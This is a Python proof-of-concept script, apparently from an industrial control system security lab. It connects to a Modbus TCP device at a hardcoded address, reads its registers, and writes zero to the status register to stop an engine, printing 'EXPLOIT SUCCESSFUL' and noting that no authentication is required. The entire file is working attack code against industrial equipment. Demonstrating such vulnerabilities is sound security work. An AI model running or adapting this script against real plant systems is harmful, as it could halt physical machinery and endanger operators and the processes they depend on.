from pyModbusTCP.client import ModbusClient
import time
import yaml
from pathlib import Path

def stop_engine(host='172.17.17.175', port=502):
    print(f"Attempting to stop engine at {host}:{port}")
    
    # Load config to get register addresses
    config_file = Path(__file__).parent / 'config.yaml'
    with open(config_file, 'r') as f:
        config = yaml.safe_load(f)
    
    registers = config['registers']
    print(f"Using register addresses from config: {registers}")
    
    # Create Modbus client
    client = ModbusClient(host=host, port=port, auto_open=True)
    
    try:
        # Try reading all registers to see what's available
        print("\nReading all registers...")
        for reg_name, reg_addr in registers.items():
            value = client.read_holding_registers(reg_addr, 1)
            if value:
                print(f"Register {reg_name} ({reg_addr}): {value[0]}")
            else:
                print(f"Register {reg_name} ({reg_addr}): Failed to read")
        
        # Write 0 to status register
        print("\n" + "*"*80)
        print("*"*80)
        print("EXECUTING SECURITY EXPLOIT")
        print("*"*80)
        print("*"*80)
        print("\nSending stop command...")
        success = client.write_single_register(registers['status'], 0)
        if success:
            print("\n" + "!"*80)
            print("!"*80)
            print("EXPLOIT SUCCESSFUL!")
            print("!"*80)
            print("!"*80)
            print("\nSuccessfully sent stop command!")
            print("This demonstrates the security vulnerability - no authentication required.")
            print("CRITICAL: The engine can be controlled by anyone on the network!")
            print("CRITICAL: No authentication or encryption is used!")
            print("CRITICAL: This is a serious security vulnerability!")
            
            # Verify the write
            time.sleep(0.1)  # Small delay
            new_status = client.read_holding_registers(registers['status'], 1)
            if new_status:
                print(f"New engine status: {new_status[0]}")
        else:
            print("Failed to send stop command")
            
        # Try reading registers again after the write
        print("\nReading registers after exploit...")
        for reg_name, reg_addr in registers.items():
            value = client.read_holding_registers(reg_addr, 1)
            if value:
                print(f"Register {reg_name} ({reg_addr}): {value[0]}")
            else:
                print(f"Register {reg_name} ({reg_addr}): Failed to read")
                
        print("\n" + "*"*80)
        print("*"*80)
        print("EXPLOIT COMPLETE")
        print("*"*80)
        print("*"*80)
                
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    stop_engine() 